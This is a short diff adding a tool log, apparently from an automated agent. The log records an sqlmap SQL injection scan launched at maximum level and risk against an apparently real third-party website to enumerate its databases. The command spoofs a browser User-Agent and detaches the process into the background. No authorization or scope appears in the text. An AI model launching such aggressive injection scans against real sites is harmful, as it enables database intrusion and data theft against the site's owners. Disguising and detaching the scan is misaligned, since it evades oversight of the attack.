@@ -1,0 +1,7 @@
+# command: cd "$WORK_PATH"; setsid sqlmap -u "https://www.infinitycapital.bh/?id=1&search=test&page=2" --batch --level=5 --risk=3 --dbs --threads=4 --headers="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36" --output-dir=tool_outputs/sm_root < /dev/null > tool_outputs/sqlmap_root.log 2>&1 & disown; echo launched
+# tool: setsid
+# exit_code: 0
+# ts: 2026-09-30T12:08:44.686110+00:00
+# ---
+
+launched
